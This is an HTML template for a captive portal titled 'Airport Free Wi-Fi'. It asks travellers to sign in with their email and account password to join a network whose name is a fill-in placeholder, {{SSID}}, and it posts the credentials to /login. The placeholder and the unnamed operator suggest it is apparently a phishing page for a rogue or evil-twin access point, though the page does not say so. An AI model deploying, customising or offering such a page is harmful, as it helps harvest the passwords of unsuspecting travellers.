<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Airport Wi-Fi</title>
<style>
*{box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif}
body{margin:0;background:#0b3a66;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{width:400px;max-width:94vw;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.25)}
.hd{background:#0b3a66;color:#fff;padding:20px 24px;display:flex;align-items:center;gap:12px}
.hd svg{width:30px;height:30px;fill:#fff;flex:0 0 auto}
.hd b{font-size:18px;font-weight:600}
.bd{padding:24px}
p.lead{color:#48566a;font-size:14px;margin:0 0 20px;line-height:1.5}
label{display:block;font-size:12px;color:#5a6472;margin:14px 0 5px;font-weight:600;text-transform:uppercase;letter-spacing:.4px}
input{width:100%;padding:13px;border:1px solid #cfd6df;border-radius:8px;font-size:15px}
input:focus{outline:none;border-color:#0b3a66;box-shadow:0 0 0 2px rgba(11,58,102,.15)}
button{width:100%;margin-top:22px;padding:14px;border:0;border-radius:8px;background:#f5a623;color:#1a1a1a;font-size:16px;font-weight:700;cursor:pointer}
.ft{padding:14px 24px;background:#f4f7fa;color:#8a94a3;font-size:11px;border-top:1px solid #e6ebf1;text-align:center}
</style></head><body>
<form class="card" method="POST" action="/login">
<div class="hd">
<svg viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5a1.5 1.5 0 0 0-3 0V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z"/></svg>
<b>Airport Free Wi-Fi</b>
</div>
<div class="bd">
<p class="lead">Welcome. Sign in with your traveller account to connect to <b>{{SSID}}</b> and get complimentary internet for your stay in the terminal.</p>
<label>Email</label>
<input name="email" type="email" autocomplete="username" placeholder="you@example.com" required>
<label>Password</label>
<input name="password" type="password" autocomplete="current-password" placeholder="Account password" required>
<button type="submit">Connect</button>
</div>
<div class="ft">Complimentary Wi-Fi &middot; Terminal network services</div>
</form></body></html>
